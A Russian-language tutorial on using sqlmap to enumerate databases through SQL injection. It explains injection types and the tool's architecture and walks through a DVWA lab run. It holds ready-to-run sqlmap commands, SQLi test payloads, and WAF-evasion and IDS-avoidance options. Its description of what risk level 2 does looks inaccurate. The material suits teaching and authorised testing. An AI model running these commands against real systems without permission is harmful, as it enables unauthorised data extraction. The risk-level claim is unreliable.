# Базовый запуск sqlmap для перечисления баз данных: архитектура, детекция и автоматизация

## Контекст и базовые понятия: место SQLmap в пентесте и природа SQLi

SQLmap представляет собой автоматизированную утилиту с открытым исходным кодом, предназначенную для обнаружения и эксплуатации уязвимостей инъекции SQL (SQL Injection, SQLi). В контексте тестирования на проникновение (penetration testing) этот инструмент занимает центральное место на этапе «Разведка и эксплуатация» (Reconnaissance & Exploitation) в рамках методологии OWASP Testing Guide или PTES. Уязвимость SQLi возникает, когда приложение передает невалидированные пользовательские данные непосредственно в запрос к базе данных (СУБД). Это позволяет атакующему изменить логику выполнения запроса, получить несанкционированный доступ к данным, обойти аутентификацию или, в некоторых конфигурациях, получить удаленное выполнение команд на сервере.

Ключевое различие, которое необходимо понимать при работе с SQLmap, — это разделение между *обнаружением* уязвимости и *эксплуатацией* (или перечислением). SQLmap выполняет обе функции, но базовый запуск для перечисления баз данных (`--dbs`) является лишь одним из этапов полного цикла эксплуатации. Инструмент не просто «взламывает» базу; он взаимодействует с приложением-посредником (web application), анализируя ответы сервера (HTTP status codes, body content, response time) для вывода о состоянии бэкенда.

Существует путаница между понятиями «SQL Injection» как классом уязвимостей и «SQLmap» как инструментом. SQLi — это архитектурный дефект, существующий в коде приложения. SQLmap — это реализация алгоритмов обхода этого дефекта. Важно также разграничивать типы инъекций, которые поддерживает SQLmap, так как от типа уязвимости зависит стратегия взаимодействия инструмента с целью:

| Тип уязвимости | Механизм передачи данных | Характер ответа приложения | Поддержка в SQLmap |
| :--- | :--- | :--- | :--- |
| **Error-based** | Вывод ошибок СУБД напрямую в HTTP-ответ. | HTTP 500, текст ошибки в теле ответа. | Высокая (быстрая детекция). |
| **Union-based** | Использование оператора `UNION SELECT` для объединения результатов запроса. | Изменение структуры HTML-страницы (появление новых данных). | Высокая (требует знания количества колонок). |
| **Boolean-based Blind** | Логические условия (`AND 1=1`, `AND 1=2`). | Различие в содержимом страницы (да/нет) при одинаковом статусе. | Средняя (медленная, требует анализа DOM). |
| **Time-based Blind** | Использование функций задержки (`SLEEP()`, `WAITFOR`). | Изменение времени отклика сервера. | Средняя (зависит от скорости сети и нагрузки). |
| **Stacked Queries** | Выполнение нескольких SQL-запросов через точку с запятой. | Изменение состояния базы данных или побочные эффекты. | Зависит от драйвера СУБД. |

SQLmap автоматизирует процесс формирования этих запросов, подставляя специальные маркеры (обычно `*` или `'`) в целевые параметры и анализируя реакцию. Понимание того, что SQLmap работает как «черный ящик» (black-box tool), критически важно: он не видит исходного кода приложения, а полагается исключительно на внешние индикаторы (side-channels).

```python
# Иллюстративная схема логики детекции внутри sqlmap (псевдокод)
def detect_injection(target_url, parameter):
    # 1. Базовый запрос
    baseline_response = send_request(target_url, {parameter: "normal_value"})
    
    # 2. Тестирование на Error-based инъекцию
    error_payload = f"{parameter}=' OR 1=1--"
    error_response = send_request(target_url, {parameter: error_payload})
    
    if is_error_detected(error_response) and is_content_different(baseline_response, error_response):
        return "VULNERABLE: Error-based SQLi"
    
    # 3. Тестирование на Boolean-based Blind инъекцию
    true_payload = f"{parameter}=1 AND 1=1"
    false_payload = f"{parameter}=1 AND 1=2"
    
    true_response = send_request(target_url, {parameter: true_payload})
    false_response = send_request(target_url, {parameter: false_payload})
    
    if is_similar(baseline_response, true_response) and is_different(baseline_response, false_response):
        return "VULNERABLE: Boolean-based Blind SQLi"
        
    return "NOT VULNERABLE (or requires manual verification)"
```

## Внутреннее устройство предмета: архитектура и алгоритмы SQLmap

SQLmap — это сложный программный комплекс, написанный на Python, который состоит из нескольких взаимосвязанных модулей. Его архитектура можно разделить на четыре основных слоя: Input/Output Layer, Core Engine, Detection/Exploitation Engine и Output Layer.

**1. Input/Output Layer (Слой ввода/вывода)**
Этот модуль отвечает за парсинг аргументов командной строки, чтение файлов конфигурации (`sqlmaprc`) и управление HTTP-запросами. Ключевым компонентом здесь является `Request` класс, который формирует HTTP-запросы с учетом всех опций: заголовков, cookie, методов (GET/POST), прокси, рандомизации User-Agent. Именно на этом этапе происходит подготовка «сырых» данных для отправки на цель.

**2. Core Engine (Ядро)**
Ядро управляет жизненным циклом теста. Оно координирует работу детектора, эксплойтера и перечислителя. Ядро также отвечает за кэширование ответов и управление параллельными потоками (threading), что позволяет ускорить тестирование. Важной частью ядра является механизм «обхода» (bypass), который пытается адаптироваться к WAF (Web Application Firewall) или другим средствам защиты, используя техники обфускации, кодирования и изменения структуры запроса.

**3. Detection/Exploitation Engine (Движок детекции и эксплуатации)**
Это «мозг» SQLmap. Он содержит набор алгоритмов для каждого типа инъекции.
*   **Fingerprinting:** Перед основной атакой SQLmap пытается определить тип СУБД (MySQL, PostgreSQL, MSSQL, Oracle, SQLite и др.) и её версию. Это делается путем отправки специфичных для каждой СУБД запросов (например, использование `@@version` для MySQL или `@@servername` для MSSQL) и анализа ответов.
*   **Injection Techniques:** Движок последовательно применяет техники в порядке приоритета (по умолчанию `BEUSTQ`: Boolean, Error, Union, Stacked, Time). Выбор техники зависит от результатов предыдущих шагов.
*   **Payload Generation:** Генератор создает тысячи вариаций payload, используя словари (wordlists) и алгоритмы брутфорса для поиска количества колонок в UNION-запросах или символов для blind-инъекций.

**4. Output Layer (Слой вывода)**
Отвечает за форматирование результатов, запись в файлы (CSV, XML, JSON, TXT) и отображение прогресса в консоли.

Процесс перечисления баз данных (`--dbs`) является одним из первых этапов после успешной детекции уязвимости. Алгоритм работает следующим образом:
1.  SQLmap определяет контекст инъекции (какой параметр уязвим, какой тип).
2.  Формируется запрос, использующий системные представления (information_schema) или специфичные системные таблицы СУБД.
    *   Для MySQL/PostgreSQL: `SELECT schema_name FROM information_schema.schemata`
    *   Для MSSQL: `SELECT name FROM master.dbo.sysdatabases`
    *   Для Oracle: `SELECT username FROM all_users`
3.  Результат извлекается через тот же канал уязвимости (например, через UNION SELECT или через время отклика в blind-режиме).
4.  Парсер извлекает имена баз данных из ответа.

## Применение и работа с предметом: синтаксис, опции и типичные сценарии

Работа с SQLmap требует понимания не только базового синтаксиса, но и тонкой настройки параметров для эффективного тестирования в реальных условиях. Базовая команда для перечисления баз данных выглядит так:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

Однако на практике этот минималистичный вызов часто приводит к ложным срабатываниям, блокировкам со стороны WAF или слишком медленной работе. Рассмотрим ключевые опции, необходимые для профессионального использования.

**1. Определение цели и параметров**
Опция `-u` указывает URL. Если уязвимый параметр не очевиден, SQLmap может попытаться протестировать все параметры автоматически, но это увеличивает шум. Лучше явно указать параметр через `-p`:
```bash
sqlmap -u "http://target.com/page.php" -p "id" --dbs
```
Для POST-запросов используется опция `--data`:
```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" -p "username" --dbs
```

**2. Управление уровнем риска и детализации**
Опции `--level` и `--risk` критически важны для контроля нагрузки на цель и обхода простых защит.
*   `--level` (1-5, по умолчанию 1): Определяет количество тестовых payload для каждого параметра. Уровень 1 проверяет только базовые тесты. Уровень 5 добавляет тесты для заголовков, cookie и других мест инъекции.
*   `--risk` (1-3, по умолчанию 1): Определяет агрессивность тестов.
    *   Risk 1: Безопасные тесты (не изменяют данные).
    *   Risk 2: Тесты, которые могут повлиять на данные (например, DROP TABLE).
    *   Risk 3: Экстремальные тесты (используют сложные payload, которые могут вызвать сбой приложения).
    Для перечисления баз данных обычно достаточно `--risk=1`, но если инъекция скрыта в заголовках, может потребоваться `--level=5`.

**3. Обход WAF и защита**
SQLmap имеет встроенные модули обхода. Опция `--tamper` позволяет применять скрипты, которые модифицируют payload перед отправкой. Например, скрипт `space2comment` заменяет пробелы на `/**/`, что помогает обойти простые регулярные выражения WAF.
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --tamper=space2comment,randomcase
```

**4. Скорость и производительность**
По умолчанию SQLmap отправляет запросы последовательно. Для ускорения используется опция `--threads`:
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --threads=10
```
Однако высокая скорость может спровоцировать срабатывание IDS/IPS. В таких случаях используется опция `--delay` для добавления задержки между запросами:
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --delay=2.5
```

**5. Типы инъекций**
Если SQLmap автоматически не определил тип уязвимости, можно принудительно указать технику через `--technique`:
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --technique=B
```
Где `B` — Boolean-based blind. Доступные техники: `B` (Boolean), `E` (Error), `U` (Union), `S` (Stacked), `T` (Time).

**Типичные ошибки при работе:**
*   **Игнорирование контекста:** Запуск `--dbs` без предварительной проверки уязвимости параметра. Если параметр не уязвим, SQLmap потратит время на тестирование всех техник.
*   **Неправильная работа с cookie:** Если сессия требует авторизации, необходимо передать cookie через `--cookie`, иначе SQLmap будет работать от имени гостя, который может не иметь доступа к нужным данным.
*   **Отключение прогресса:** Использование `--batch` без понимания, что происходит. В режиме batch SQLmap принимает все решения автоматически, что может привести к нежелательным действиям (например, дампу не тех таблиц).

## Сквозной практический пример: Перечисление баз данных на уязвимой цели

**Исходные условия:**
*   **Среда:** Локальная лаборатория с установленным DVWA (Damn Vulnerable Web Application) или SQLi Lab.
*   **Цель:** Веб-приложение с параметром `id` в GET-запросе, который, как известно, уязвим к Boolean-based blind SQLi (подтверждено ручным тестированием: `?id=1' AND '1'='1` возвращает страницу, `?id=1' AND '1'='2` возвращает пустую страницу).
*   **Инструмент:** SQLmap (версия 1.7+).
*   **Роль:** Пентестер, проводящий тестирование на проникновение с письменного разрешения владельца.
*   **Цель этапа:** Получить список всех доступных баз данных на сервере.

**Шаг 1: Инициализация теста с указанием цели и параметра**
Запускаем SQLmap с указанием URL и явно указываем параметр `id`. Используем флаг `--batch` для автоматического принятия стандартных ответов (например, подтверждения продолжения теста), чтобы не прерывать процесс.

```bash
sqlmap -u "http://192.168.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p "id" --batch --dbs
```

**Шаг 2: Анализ процесса детекции и фангерпринтинга**
SQLmap начинает с проверки уязвимости. В выводе мы увидим этапы тестирования техник. Поскольку мы знаем, что инъекция Boolean-based, SQLmap быстро определит это и перейдет к фангерпринтингу СУБД.

*Ожидаемый вывод (фрагмент консоли):*
```text
[12:00:01] [INFO] testing connection to the target URL
[12:00:02] [INFO] testing for SQL injection on parameter 'id'
[12:00:05] [INFO] heuristic (basic) check shows that parameter 'id' might be injectable (possible DBMS: MySQL)
[12:00:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:00:15] [INFO] parameter 'id' appears to be 'Boolean-based blind' injectable
[12:00:16] [INFO] fingerprinting the back-end DBMS
[12:00:20] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[12:00:25] [INFO] back-end DBMS: MySQL >= 5.0
```

**Шаг 3: Выполнение перечисления баз данных**
После подтверждения уязвимости и определения СУБД, SQLmap выполняет запрос для получения списка баз данных. В режиме Boolean-based blind это делается путем побитового извлечения имен баз данных из системной таблицы `information_schema.schemata`.

*Ожидаемый вывод (фрагмент консоли):*
```text
[12:01:00] [INFO] fetching databases
[12:01:05] [INFO] retrieved: 'information_schema'
[12:01:10] [INFO] retrieved: 'dvwa'
[12:01:15] [INFO] retrieved: 'mysql'
[12:01:20] [INFO] retrieved: 'phpmyadmin'
[12:01:25] [INFO] retrieved: 'test'

available databases [5]:
[*] dvwa
[*] information_schema
[*] mysql
[*] phpmyadmin
[*] test
```

**Шаг 4: Интерпретация результатов**
Полученный список содержит системные базы (`information_schema`, `mysql`) и прикладные (`dvwa`). Для пентестера критически важна база `dvwa`, так как она содержит данные приложения. Следующим шагом будет перечисление таблиц в этой базе (`-D dvwa --tables`).

**Ожидаемый вывод по теме:**
Пример демонстрирует, что SQLmap успешно автоматизировал процесс от детекции уязвимости до извлечения структурной информации. Ключевым моментом является то, что даже в режиме blind SQLi (без вывода ошибок или данных в ответе) инструмент смог восстановить список баз данных, используя логические условия и анализ различий в ответах сервера. Это подтверждает эффективность SQLmap для этапа разведки при наличии уязвимости.

## Аналитический вывод

SQLmap является мощным инструментом автоматизации, который существенно снижает порог входа для эксплуатации уязвимостей SQLi, но его использование требует глубокого понимания механизмов работы СУБД и веб-приложений. Базовый запуск для перечисления баз данных (`--dbs`) — это лишь верхушка айсберга; реальная эффективность инструмента раскрывается при тонкой настройке параметров обхода WAF, управления скоростью и выборе правильных техник инъекции. Важно помнить, что SQLmap не создает уязвимости, а лишь эксплуатирует существующие дефекты валидации ввода. В современных условиях, при наличии сложных WAF и систем защиты, прямой запуск SQLmap часто блокируется, что требует применения техник обхода (tamper scripts, кодирование) или ручного дополнения автоматизированного тестирования. Для специалистов по безопасности понимание внутренней логики SQLmap полезно не только для проведения пентестов, но и для разработки правил детекции (SIEM/SIGMA), так как позволяет предсказать паттерны атакующих запросов.
